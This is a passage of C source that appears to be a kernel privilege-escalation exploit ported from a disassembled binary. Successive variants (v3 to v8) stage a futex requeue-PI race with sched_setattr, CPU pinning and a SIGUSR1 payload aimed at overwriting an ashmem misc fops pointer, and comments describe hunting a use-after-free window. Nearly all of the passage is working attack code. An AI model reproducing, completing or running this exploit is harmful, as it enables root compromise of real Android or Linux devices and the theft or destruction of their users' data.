    fprintf(stderr, "[futex-v3] sigusr1 fire_and_wait=%d\n", sig_ok);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *owner_thread_fn_two_locks(void *arg) {
  (void)arg;
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v3] owner lock target errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&owner_started, 1);
  while (!atomic_load(&g_requeue_succeeded)) {
    __asm__ volatile("yield" ::: "memory");
  }
  fprintf(stderr, "[futex-v3] owner attempting second lock (f_pi_chain)\n");
  errno = 0;
  long ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  fprintf(stderr, "[futex-v3] owner lock chain ret=%ld errno=%d\n", ret, errno);
  atomic_store(&owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v3_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_requeue_succeeded, 0);

  pthread_t waiter, owner;
  if (pthread_create(&owner, NULL, owner_thread_fn_two_locks, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }
  if (pthread_create(&waiter, NULL, waiter_thread_fn_two_locks, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&waiter_waiting)) {
    usleep(1000);
  }

  errno = 0;
  long requeue_ret =
      futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
               &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v3] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  if (requeue_ret < 0) {
    fprintf(stderr, "[futex-v3] requeue failed, aborting before trigger\n");
    return 0;
  }
  atomic_store(&g_requeue_succeeded, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v3] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex-v3] firing sched_setattr tid=%d\n", tid);
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v3] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v3] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v3] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v3_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v3] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v3_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

int run_futex_trigger_success_full(uint64_t page_base,
                                    uint64_t ashmem_misc_fops_addr,
                                    futex_post_trigger_cb post_trigger_cb,
                                    void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v2] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_success_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

int run_futex_trigger_full(uint64_t page_base, uint64_t ashmem_misc_fops_addr,
                            futex_post_trigger_cb post_trigger_cb, void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: fcn.000044f4 (app_main), fresh re-disasm this session -- see
 * futex_trigger.h's comment above run_futex_trigger_v4_cb() for the
 * full derivation of the four corrections applied here on top of the
 * already-byte-accurate waiter_thread_fn/owner_thread_fn (unchanged,
 * reused as-is). This is the calling thread's own body (app_main IS
 * the consumer in the real binary, not a separate pthread), so
 * pin_to_cpu(1) affects the calling thread directly, exactly matching
 * fcn.000041f0(1) at raw vaddr 0x4324. */
int run_futex_trigger_v4_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);

  pin_to_cpu(1);

  pthread_t waiter, owner;
  if (pthread_create(&waiter, NULL, waiter_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }

  /* source: raw vaddr 0x46f4-0x4708 -- app_main's real wait condition is
   * (waiter_waiting != 0) OR (owner_started != 0), i.e. OR not AND like
   * every earlier variant here (that part of the earlier port was
   * right). CORRECTED during a final double-check this same session:
   * initially misread the flag app_main polls at G+0x744 as
   * waiter_tid_g (G+0x730, set right after gettid()) -- it is actually
   * `stlr w19,[x20]` at raw vaddr 0x3f28, in the waiter, writing 1 to
   * G+0x744 immediately before its WAIT_REQUEUE_PI call. That is
   * exactly this project's own existing `waiter_waiting` flag (already
   * set at the right place in waiter_thread_fn, just referenced by the
   * wrong name below until this fix) -- much LATER than waiter_tid_g,
   * after LOCK_PI(f_pi_chain)/waiter_ready/the owner_started wait/
   * clock_gettime have all already happened. Using waiter_tid_g here
   * would have started the 100ms countdown far too early. */
  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* source: raw vaddr 0x470c-0x4714: `mov w0,0x86a0; movk w0,1,lsl 16`
   * = 0x186a0 = 100000 -> usleep(100000). Fixed 100ms pause, present in
   * the real binary, absent from every earlier variant here. */
  usleep(100000);

  long requeue_ret = 0;
  int requeue_errno = 0;
  errno = 0;
  requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                          (void *)1, &f_pi_target, 0);
  requeue_errno = errno;
  fprintf(stderr, "[futex-v4] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  if (requeue_ret == -1 && requeue_errno == EDEADLK) {
    fprintf(stderr,
            "[futex-v4] EDEADLK (matches original dance's natural "
            "outcome) -- aborting before trigger\n");
    atomic_store(&deadlock_seen, 1);
    return 0;
  }
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v4] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex-v4] firing sched_setattr tid=%d policy=SCHED_BATCH nice=19\n",
          tid);
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v4] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v4] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v4] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v4_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v4] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v4_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: fcn.00004300 (real consumer thread), fresh re-disassembly
 * this session -- see run_futex_trigger_v5_cb()'s comment in
 * futex_trigger.h for the full derivation. Genuinely separate thread
 * from the calling/app_main-equivalent thread, pinned to CPU 1 (its
 * real first action, raw vaddr 0x4324), firing sched_setattr on the
 * waiter's tid as soon as that tid is known -- not gated on
 * CMP_REQUEUE_PI's result or route_done, unlike every earlier variant
 * in this project. */
static atomic_int g_consumer_done;
static long g_consumer_ret;
static int g_consumer_errno;

static void *consumer_thread_fn(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  fprintf(stderr, "[futex-v5] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19 (independent of "
                   "cmp_requeue_pi/route_done)\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v5] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  g_consumer_ret = ret;
  g_consumer_errno = saved_errno;
  atomic_store(&g_consumer_done, 1);
  return NULL;
}

int run_futex_trigger_v5_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_consumer_done, 0);
  g_consumer_ret = -1;
  g_consumer_errno = 0;

  pin_to_cpu(0); /* source: raw vaddr 0x4580-0x4584 -- app_main pins
                   * ITSELF to CPU 0, separately from consumer's CPU 1. */

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn, NULL) != 0) {
    return 0;
  }

  /* source: same correction as run_futex_trigger_v4_cb() above -- real
   * condition is (waiter_waiting != 0) OR (owner_started != 0), not
   * waiter_tid_g. See v4's comment for the full derivation. */
  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000); /* source: raw vaddr 0x470c-0x4714, real fixed 100ms */

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v5] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  /* Real app_main never checks this return value at all -- logged only,
   * never gates anything below, matching the real binary exactly. */
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }
  while (!atomic_load(&g_consumer_done)) {
    usleep(1000);
  }
  fprintf(stderr,
          "[futex-v5] consumer done: sched_setattr ret=%ld errno=%d\n",
          g_consumer_ret, g_consumer_errno);

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v5] waiter route not ok, aborting before verify\n");
    return 0;
  }
  if (g_consumer_ret != 0) {
    fprintf(stderr,
            "[futex-v5] consumer sched_setattr failed, aborting before "
            "verify\n");
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v5] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v5] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v5_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v5] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v5_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: raw vaddr 0x40d8-0x4160 (waiter, fcn.00003e18) cross-
 * referenced against raw vaddr 0x44ac-0x44bc (consumer, fcn.00004300) --
 * see run_futex_trigger_v6_cb()'s comment in futex_trigger.h for the
 * full derivation. G+0x750/G+0x760 real handshake, ported as
 * g_sched_setattr_done/g_sched_setattr_ok. */
static atomic_int g_sched_setattr_done;
static atomic_int g_sched_setattr_ok;
static atomic_int g_sched_setattr_result_ok;
static futex_post_trigger_cb g_post_cb;
static void *g_post_cb_ctx;
static int32_t *g_sched_mutation_state;
static int32_t g_sched_pending_state;
static int32_t g_sched_mutated_state;
/* Only the phase that installs the live fops pointer makes a retry unsafe.
 * The neutral settle and the reversible oracle apply/restore phases reuse the
 * same consumer, but must not publish ATTEMPT_KERNEL_MUTATED. */
static int g_sched_mutation_sequence;
static atomic_int g_cb_invoked;
static atomic_int g_cb_result;

static void *waiter_thread_fn_v6(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v6] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v6] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v6] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* source: raw vaddr 0x40e8-0x412c -- wait for the consumer
       * thread's sched_setattr call to complete (real binary: tight
       * yield spin, up to ~1e9 iterations; ported as a bounded usleep
       * poll instead -- functionally equivalent, avoids pinning a core
       * at 100% for a potentially very long time on a slower/loaded
       * device). */
      for (int spins = 0; spins < 20000 &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(1000);
      }
      /* source: raw vaddr 0x4144-0x414c -- verify() only called if
       * G+0x760 (g_sched_setattr_ok) >= 1, i.e. the SEPARATE consumer
       * thread's sched_setattr call genuinely succeeded. */
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v6] calling post-trigger callback from WAITER "
                "thread (matches real fcn.000076c0 call site)\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v6] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v6] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  while (!atomic_load(&owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

/* source: raw vaddr 0x44ac-0x44bc (consumer, fcn.00004300) -- same
 * sched_setattr call as consumer_thread_fn(), but ALSO signals
 * g_sched_setattr_done/g_sched_setattr_ok back to the waiter thread,
 * matching the real G+0x750/G+0x760 writes exactly (order matters:
 * the real binary increments G+0x760 -- here, sets g_sched_setattr_ok
 * -- BEFORE setting G+0x750 -- g_sched_setattr_done -- which is what
 * the waiter actually polls; preserved here for fidelity even though
 * the waiter only checks g_sched_setattr_ok after observing
 * g_sched_setattr_done, so the order isn't behaviorally required by
 * this port's own polling, just kept faithful to the source). */
static void *consumer_thread_fn_v6(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  /* source: raw vaddr 0x4420-0x4460 (consumer, fcn.00004300) -- the
   * real consumer reads S23_SUPERVISOR_ATTEMPT and busy-waits the
   * matching cycle-table entry right before sched_setattr. v4/v5 had
   * this (in the calling thread, before their own sched_setattr call);
   * v6's dedicated consumer thread was missing it until now. */
  spin_wait_cycles(supervisor_attempt_delay_cycles());

  fprintf(stderr, "[futex-v6] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v6] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret == 0) {
    atomic_store(&g_sched_setattr_ok, 1);
  }
  atomic_store(&g_sched_setattr_done, 1);
  return NULL;
}

int run_futex_trigger_v6_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0); /* app_main-equivalent's own real placement */

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v6, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v6, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000); /* real fixed 100ms, raw vaddr 0x470c-0x4714 */

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v6] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1); /* real app_main never checks this ret */

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v6] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr,
            "[futex-v6] verify callback never invoked (sigusr1 handler "
            "or consumer sched_setattr did not both succeed) -- matches "
            "what the real binary would also skip\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v6_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v6] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v6_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: see run_futex_trigger_v7_cb()'s comment in futex_trigger.h
 * for the full derivation. g_sigusr1_done signals the SAME thing the
 * real G+0x76c pulse does (waiter's SIGUSR1 handler succeeded) --
 * consumer_thread_fn_v7 gates on it before calling sched_setattr,
 * fixing v6's (and v4/v5's) real bug of firing at t=0 instead. */
static atomic_int g_sigusr1_done;

static void *waiter_thread_fn_v7(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v7] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v7] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v7] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* source: raw vaddr 0x40fc -- real G+0x76c pulse, right here,
       * immediately after SIGUSR1 success. This is what unblocks the
       * consumer thread's sched_setattr call -- the fix this variant
       * makes. */
      atomic_store(&g_sigusr1_done, 1);

      /* source: raw vaddr 0x40e8-0x412c -- wait for consumer's
       * sched_setattr to complete (real: tight yield spin up to ~1e9
       * iterations; ported as a bounded usleep poll). */
      for (int spins = 0; spins < 20000 &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(1000);
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v7] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v7] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v7] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  while (!atomic_load(&owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

/* source: raw vaddr 0x4360-0x43ac (consumer, fcn.00004300) -- THE
 * critical fix: gate on g_sigusr1_done (the real G+0x76c condition)
 * BEFORE firing sched_setattr, instead of firing as soon as the
 * waiter's tid is merely known. This is what makes
 * rt_mutex_adjust_pi()'s task->pi_blocked_on read happen at the real,
 * temporally-correct moment -- immediately after the waiter's SIGUSR1/
 * FPSIMD payload delivery, not ~8 seconds before it. */
static void *consumer_thread_fn_v7(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  /* THE fix: real consumer tight-spins on G+0x76c (here,
   * g_sigusr1_done) and does not proceed to sched_setattr until it's
   * set -- unlike every earlier variant in this project. */
  while (!atomic_load(&g_sigusr1_done)) {
    __asm__ volatile("yield" ::: "memory");
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  fprintf(stderr, "[futex-v7] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19 (gated on waiter's "
                   "sigusr1 success, matching real G+0x76c timing)\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v7] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret == 0) {
    atomic_store(&g_sched_setattr_ok, 1);
  }
  atomic_store(&g_sched_setattr_done, 1);
  return NULL;
}

int run_futex_trigger_v7_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v7, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v7, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v7] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v7] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v7] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v7_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v7] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v7_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: this project's own hypothesis, not the closed binary -- see
 * run_futex_trigger_v8_cb()'s comment in futex_trigger.h for the full
 * derivation (interrupt the owner thread's blocked second LOCK_PI
 * right as the waiter's SIGUSR1 payload lands, testing for a UAF
 * window in the kernel's interrupted-PI-wait cleanup path). */
static atomic_int owner_tid_g;

static void sigusr2_noop_handler(int sig) { (void)sig; }

static void *owner_thread_fn_v8(void *arg) {
  (void)arg;
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&owner_tid_g, tid);

  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v8] owner lock target errno=%d\n", errno);
    return NULL;
  }
  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }
  atomic_store(&owner_started, 1);
  errno = 0;
  long ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int saved_errno = errno;
  fprintf(stderr,
          "[futex-v8] owner lock chain ret=%ld errno=%d%s\n", ret,
          saved_errno,
          (ret == -1 && saved_errno == EINTR) ? " (INTERRUPTED)" : "");
  atomic_store(&owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

static void *waiter_thread_fn_v8(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v8] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

